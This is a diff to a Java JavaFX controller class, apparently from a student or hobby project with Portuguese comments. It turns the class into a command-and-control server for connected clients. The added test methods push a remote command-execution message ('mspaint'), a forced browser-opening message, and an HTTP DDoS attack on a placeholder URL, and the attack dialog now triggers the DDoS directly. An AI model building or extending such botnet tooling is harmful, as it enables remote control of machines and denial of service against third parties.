@@ -7,11 +7,13 @@ package br.com.view;
  * Time: 18:42
  */
 
-import br.com.controller.ClientAttackDialogController;
 import br.com.controller.ClientController;
-import br.com.core.OnServerCallback;
 import br.com.core.Server;
+import br.com.core.callback.OnServerCallback;
 import br.com.model.ClientTableRow;
+import br.com.view.notification.NotificationManager;
+import br.com.view.notification.models.NotificationType;
+import compton.AttackBuilder;
 import javafx.application.Application;
 import javafx.application.Platform;
 import javafx.fxml.FXMLLoader;
@@ -19,13 +21,15 @@ import javafx.scene.Scene;
 import javafx.scene.image.Image;
 import javafx.scene.layout.AnchorPane;
 import javafx.scene.layout.BorderPane;
-import javafx.stage.Modality;
 import javafx.stage.Stage;
+import model.GenericMessage;
+import model.constant.ClientStatusEnum;
 
 import java.io.IOException;
 
 public class MainApp extends Application implements OnServerCallback {
 
+    private Server mServer;
     private Stage mPrimaryStage;
     private BorderPane mRootLayout;
     private ClientController mClientController;
@@ -53,12 +57,31 @@ public class MainApp extends Application implements OnServerCallback {
         loadContent();
     }
 
+    private void test1(ClientTableRow row) {
+        GenericMessage mspaint = AttackBuilder.buildCommandLineExecuter()
+                .withCommand("mspaint")
+                .build();
+        mServer.sendMsgToClient(row, mspaint);
+    }
+
+    private void test2(ClientTableRow row) {
+        GenericMessage build = AttackBuilder.buildBrowserOpening()
+                .withURL("www.youtube.com.br")
+                .build();
+        mServer.sendMsgToClient(row, build);
+    }
+
+    private void test3(ClientTableRow row) {
+        GenericMessage genericMessage = AttackBuilder.buildDDOSAttack().withUrl("https://www.aaa.com").withQuantity(5).buildHTTP();
+        mServer.sendMsgToClient(row, genericMessage);
+    }
+
     public void startServer(int port) {
-        Server.Start(this, port);
+        mServer = Server.Start(this, port);
     }
 
     public void stopServer() {
-        Server.closeConnections();
+        if (mServer != null) mServer.stopServer();
     }
 
     /**
@@ -98,17 +121,31 @@ public class MainApp extends Application implements OnServerCallback {
 
     @Override
     public void onClientConnected(ClientTableRow client) {
+        System.out.println("Cliente conectado -> " + client);
+        NotificationManager.showNewClientConnected(client);
         mClientController.add(client);
     }
 
     @Override
     public void onClientDisconnected(ClientTableRow client) {
+        System.out.println("Cliente desconectado -> " + client);
+        NotificationManager.showCustomNotification("Usuário desconectado!", client + " perdeu conexão ç.ç", NotificationType.INFORMATION);
         mClientController.remove(client);
     }
 
     @Override
-    public void onServerDisconnect() {
+    public void onMessageReceived(ClientTableRow clientTableRow, GenericMessage message) {
+        NotificationManager.showCustomNotification("Mensagem recebido de: " + clientTableRow.getName(), message.getAsString(), NotificationType.INFORMATION);
+    }
 
+    @Override
+    public void onDisconnect() {
+        System.out.println("Servidor desconectado!");
+    }
+
+    @Override
+    public void onClientStatusChanged(ClientTableRow client, ClientStatusEnum status) {
+        mClientController.updateStatus(client, status);
     }
 
     /**
@@ -118,7 +155,14 @@ public class MainApp extends Application implements OnServerCallback {
      * @return true Se o usuário realizar alguma ativadade ilicita, caso contrario false.
      */
     public boolean showClientAttackDialog(ClientTableRow client) {
-        // Mostrar url de destino e potencia
+
+        //test1(client);
+
+        //test2(client);
+
+        test3(client);
+
+        /*// Mostrar url de destino e potencia
         try {
             // Carrega o arquivo fxml e cria um novo stage para a janela popup
             FXMLLoader loader = new FXMLLoader();
@@ -145,6 +189,7 @@ public class MainApp extends Application implements OnServerCallback {
         } catch (IOException e) {
             e.printStackTrace();
             return false;
-        }
+        }*/
+        return true;
     }
 }
